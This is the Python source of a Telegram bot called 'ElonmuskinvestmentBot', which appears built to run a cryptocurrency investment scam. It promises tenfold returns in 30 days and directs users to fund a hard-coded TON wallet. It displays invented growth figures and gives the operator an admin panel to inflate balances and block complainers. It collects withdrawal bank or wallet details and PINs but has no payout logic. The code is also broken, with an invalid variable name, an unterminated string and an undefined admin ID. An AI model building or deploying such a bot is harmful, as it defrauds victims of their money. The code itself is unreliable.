import telebot
from telebot import types
import pycountry
import json
import os
from datetime import datetime
os.getenv('API_TOKEN')
MY_TON COIN= '0x58Ed91E903BbD23782A166f2434F85114A5e9594'
CHANGELY = 'https://changelly.com/'
DB_FILE = "bot_data.json"
import os
from dotenv import load_dotenv
load_dotenv() # This loads the variables
API_TOKEN = os.getenv('API_TOKEN') # This gets the token from Render
bot = telebot.TeleBot(API_TOKEN)
# --- DATABASE LOGIC ---
def load_data():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {"users": {}, "reports": []}

def save_data(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

db = load_data()

def get_user(uid):
    uid = str(uid)
    if uid not in db["users"]:
        db["users"][uid] = {
            "step": "start", "balance": 0.0, "name": "", 
            "pin": None, "linked": False, "investments": [], 
            "blocked": False, "method_type": None
        }
    return db["users"][uid]

def is_valid_country(text):
    for c in pycountry.countries:
        if text.lower() == c.name.lower(): return True
    return False if len(text) != 2 else True

# --- MAIN MENU ---
def show_menu(chat_id, name, edit=False, message_id=None):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("💳 Wallet", callback_data="main_wallet"),
        types.InlineKeyboardButton("📊 Dashboard", callback_data="main_dash"),
        types.InlineKeyboardButton("📉 Analytics", callback_data="main_anal"),
        types.InlineKeyboardButton("❔ Help", callback_data="main_help")
    )
    text = f"Welcome to **ElonmuskinvestmentBot**, {name}! 🚀"
    if edit and message_id:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
    else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

# --- COMMANDS ---
@bot.message_handler(commands=['start'])
def start(m):
    u = get_user(m.from_user.id)
    if u["blocked"]: return
    if u["step"] == "completed":
        bot.send_message(m.chat.id, "Welcome back! ⚡")
        show_menu(m.chat.id, u["name"])
    else:
        u["step"] = "awaiting_country"
        save_data(db)
        bot.send_message(m.chat.id, "Welcome! 👋\nPlease send your **Country Name** or **Flag** to verify.")

@bot.message_handler(commands=['admin'])
def admin_panel(m):
    if m.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("Check Reports", callback_data="adm_reports"),
        types.InlineKeyboardButton("Control User", callback_data="adm_control")
    )
    bot.send_message(m.chat.id, "🛠 **Admin Panel**", reply_markup=markup)

# --- TEXT HANDLER ---
@bot.message_handler(func=lambda m: True)
def handle_text(m):
    uid = str(m.from_user.id)
    u = get_user(uid)
    if u["blocked"]: return

    if u["step"] == "awaiting_country":
        if is_valid_country(m.text):
            u["step"] = "awaiting_name"
            bot.reply_to(m, "✅ Verified! Now enter your **Full Name** (2+ words):")
        else: bot.reply_to(m, "❌ Invalid country or flag. Try again.")
    
    elif u["step"] == "awaiting_name":
        if len(m.text.split()) >= 2:
            u["name"] = m.text
            u["step"] = "completed"
            show_menu(m.chat.id, m.text)
        else: bot.reply_to(m, "⚠️ Please enter a full name (minimum 2 words).")
    
    elif u["step"] == "filing_report":
        db["reports"].append({"id": uid, "msg": m.text})
        u["step"] = "completed"
        bot.send_message(m.chat.id, "✅ Your report has been sent to the admin.")
        bot.send_message(ADMIN_ID, f"🔔 **New Report from {uid}**:\n{m.text}")
        show_menu(m.chat.id, u["name"])
    
    elif u["step"] == "setting_pin":
        if m.text.isdigit() and len(m.text) == 4:
            u["pin"] = m.text
            u["linked"] = True
            u["step"] = "completed"
            bot.send_message(m.chat.id, "✅ Withdrawal PIN created successfully!")
            show_menu(m.chat.id, u["name"])
        else: bot.send_message(m.chat.id, "❌ PIN must be exactly 4 digits.")

    elif u["step"].startswith("adm_set_bal_"):
        target_id = u["step"].replace("adm_set_bal_", "")
        try:
            amount = float(m.text)
            db["users"][target_id]["balance"] += amount
            u["step"] = "completed"
            bot.send_message(m.chat.id, f"✅ Added ${amount} to User {target_id}")
            bot.send_message(int(target_id), f"💰 Your balance has been updated! +${amount}")
        except: bot.send_message(m.chat.id, "❌ Enter a valid number.")

    elif u["step"] == "adm_get_id":
        target_id = m.text.strip()
        if target_id in db["users"]:
            u["step"] = "completed"
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("Increase Balance", callback_data=f"adm_inc_{target_id}"),
                types.InlineKeyboardButton("Block User", callback_data=f"adm_blk_{target_id}"),
                types.InlineKeyboardButton("⬅️ Back to Admin", callback_data="back_admin")
            )
            bot.send_message(m.chat.id, f"Managing User: {target_id}", reply_markup=markup)
        else: bot.send_message(m.chat.id, "❌ User ID not found.")

    save_data(db)

# --- CALLBACK HANDLER ---
@bot.callback_query_handler(func=lambda c: True)
def handle_callbacks(c):
    uid = str(c.from_user.id)
    u = get_user(uid)

    # BACK TO MAIN MENU
    if c.data == "back_main":
        show_menu(c.message.chat.id, u["name"], edit=True, message_id=c.message.message_id)

    elif c.data == "main_wallet":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("Withdraw", callback_data="with_check"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
        )
        bot.edit_message_text(f"💳 **Wallet Balance**\n\nTotal: `${u['balance']:,.2f}`", c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif c.data == "main_dash":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("$2,000 to get $20,000", callback_data="inv_2000"),
            types.InlineKeyboardButton("$5,000 to get $50,000", callback_data="inv_5000"),
            types.InlineKeyboardButton("$6,000 to get $60,000", callback_data="inv_6000"),
            types.InlineKeyboardButton("$10,000 to get $100,000", callback_data="inv_10000"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
        )
        bot.edit_message_text("📈 **Investment Plans**\nSelect a plan to invest:", c.message.chat.id, c.message.message_id, reply_markup=markup)

    elif c.data.startswith("inv_"):
        amt = int(c.data.split("_")[1])
        msg = f"📥 **Plan Selected: ${amt}**\n\nTo begin, copy the TON address below and fund it. \n\nTON Address:\n`{MY_TON COIN}`\n\nLink:\n{CHANGELY}\n\"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back to Dashboard", callback_data="main_dash"))
        bot.edit_message_text(msg, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif c.data == "main_anal":
        text = "📉 **Analytics & Growth**\n"
        now = datetime.now()
        if not u["investments"]:
            text += "\nNo active investments found."
        else:
            for inv in u["investments"][:]:
                start_date = datetime.fromisoformat(inv['date'])
                days = min((now - start_date).days, 30)
                growth = (inv['amt'] * 9 / 30) * days
                total = inv['amt'] + growth
                
                if days >= 30:
                    u["balance"] += (inv['amt'] * 10)
                    u["investments"].remove(inv)
                    bot.send_message(uid, f"✨ **Congratulations!** Your ${inv['amt']} investment has matured to ${inv['amt']*10}!")
                else:
                    text += f"\n💰 Plan: ${inv['amt']}\n📅 Day: {days}/30\n📈 Current: `${total:,.2f}`\n"
        
        save_data(db)
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back", callback_data="back_main"))
        bot.edit_message_text(text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif c.data == "main_help":
        markup = types.InlineKeyboardMarkup(row_width=2).add(
            types.InlineKeyboardButton("Make a Report", callback_data="h_report"),
            types.InlineKeyboardButton("Read Manual", callback_data="h_manual"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
        )
        bot.edit_message_text("How can we help you today?", c.message.chat.id, c.message.message_id, reply_markup=markup)

    elif c.data == "h_manual":
        manual = ("📘 **User Manual**\n\n"
                 "1. **Start**: Register with your country and name.\n"
                 "2. **Invest**: Choose a plan in Dashboard. Fund the BTC address.\n"
                 "3. **Track**: Check 'Analytics' to see your daily 10x growth.\n"
                 "4. **Withdraw**: Once matured (30 days), link your bank/wallet and withdraw.")
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back", callback_data="main_help"))
        bot.edit_message_text(manual, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif c.data == "h_report":
        u["step"] = "filing_report"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Cancel", callback_data="main_help"))
        bot.edit_message_text("Please type your complaint/report:", c.message.chat.id, c.message.message_id, reply_markup=markup)
        save_data(db)

    elif c.data == "with_check":
        if u["balance"] <= 0:
            bot.answer_callback_query(c.id, "❌ Insufficient funds! Your balance is $0.00", show_alert=True)
        elif not u["linked"]:
            markup = types.InlineKeyboardMarkup(row_width=2).add(
                types.InlineKeyboardButton("Wallet Address", callback_data="lnk_wallet"),
                types.InlineKeyboardButton("Bank Account", callback_data="lnk_bank"),
                types.InlineKeyboardButton("⬅️ Back", callback_data="main_wallet")
            )
            bot.edit_message_text("Please link a withdrawal method:", c.message.chat.id, c.message.message_id, reply_markup=markup)
        else:
            bot.send_message(c.message.chat.id, "Enter your 4-digit PIN to withdraw:")

    elif c.data.startswith("lnk_"):
        u["step"] = "linking_wallet" if "wallet" in c.data else "linking_bank"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Cancel", callback_data="main_wallet"))
        bot.edit_message_text("Please enter your details (Address or Bank info):", c.message.chat.id, c.message.message_id, reply_markup=markup)
        save_data(db)

    # --- ADMIN CALLBACKS ---
    elif c.data == "back_admin":
        admin_panel(c.message) # Just calls the command logic again

    elif c.data == "adm_control":
        u["step"] = "adm_get_id"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back", callback_data="back_admin"))
        bot.edit_message_text("Send the User ID:", c.message.chat.id, c.message.message_id, reply_markup=markup)
        save_data(db)

    elif c.data.startswith("adm_inc_"):
        target = c.data.replace("adm_inc_", "")
        u["step"] = f"adm_set_bal_{target}"
        bot.send_message(c.message.chat.id, f"How much to add to {target}?")
        save_data(db)

    elif c.data.startswith("adm_blk_"):
        target = c.data.replace("adm_blk_", "")
        db["users"][target]["blocked"] = True
        bot.send_message(c.message.chat.id, f"User {target} blocked.")
        save_data(db)

print("ElonmuskinvestmentBot started...")
bot.infinity_polling()
